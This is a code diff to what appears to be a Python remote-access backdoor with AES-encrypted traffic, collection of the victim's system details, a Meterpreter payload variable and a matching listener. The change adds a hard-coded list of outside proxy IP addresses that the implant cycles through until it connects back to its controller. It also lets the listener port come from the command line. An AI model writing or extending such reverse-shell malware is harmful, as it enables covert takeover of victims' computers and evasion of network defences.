@@ -147,7 +147,7 @@ EncodeAES = lambda c, s: base64.b64encode(c.encrypt(s))
 DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e))
 iv = Random.new().read(AES.block_size)
 cipher = AES.new(secret,AES.MODE_CFB, iv)
-MeterBin, DropSock, is64 = None, None, False
+MeterBin, DropSock, pconnect = None, None, False
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 isAdmin, isSystem, is64, isWindows, ushell = False, False, False, False, False
 opsys = platform.uname()[0] + ' ' + platform.uname()[2]
@@ -256,22 +256,36 @@ else:
 	pwd = fsubprocess(pwdvar).strip('**n').strip('**r')
 	success = EncodeAES(cipher, 'E' * 64 + '%sEOFEOFEOFEOFEOUH%s%s' % (paddedopsys, paddedpwd, starpadding))
 
+	#################################################################################################################
+
                                # HTTP PROXY SETTINGS - proxies can only be HTTP/S !
 useproxy = False               # Set to True to use the proxy.
-proxyhost = "37.187.58.37"     # Set to the hostname (IP) of the proxy.
-proxyport = 3128               # Set to the port of the proxy.
+							   # Add as many proxies as you want below, the script will
+							   # try them all in order in a loop until it connects.
 
-try:
-	if useproxy:
-		s = socks.socksocket()
-		s.setproxy(socks.HTTP,proxyhost,proxyport)
-		success = "GET / HTTP/1.1**r**n**r**n" + success
-	else:
-		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-except:
+proxies = [["37.187.58.37", 3128], ["188.40.252.215", 7808], ["65.49.14.147", 3080], ["188.40.252.215", 3127], ["64.31.22.143", 8089],
+		  ["108.165.33.7", 3128], ["108.165.33.12", 3128], ["104.140.67.36", 8089], ["108.165.33.4", 3128]] 
+
+	#################################################################################################################
+
+if useproxy:
+	while not pconnect:
+		for proxy in proxies:
+			try:
+				s = socks.socksocket()
+				s.setproxy(socks.HTTP,proxy[0],proxy[1])
+				s.settimeout(20)
+				s.connect((host, port))
+				success = "GET / HTTP/1.1**r**n**r**n" + success
+				pconnect = True
+				break
+			except:
+				pass
+
+else:
 	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	s.connect((host, port))
 
-s.connect((host, port))
 s.send(success)
 
 while 1:
@@ -638,10 +652,12 @@ isAdmin, is64, isSystem, isProxied, isWindows, newpwd = False, False, False, Fal
 iv = Random.new().read(AES.block_size)
 cipher = AES.new(secret,AES.MODE_CFB, iv)
 c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-c.bind(('0.0.0.0', int(listenport)))
+try:
+	c.bind(('0.0.0.0', int(sys.argv[1])))
+except:	
+	c.bind(('0.0.0.0', int(listenport)))
 c.listen(128)
-c.settimeout(25)
-
+c.settimeout(30)
 fmainloop(True)
 
 while True:
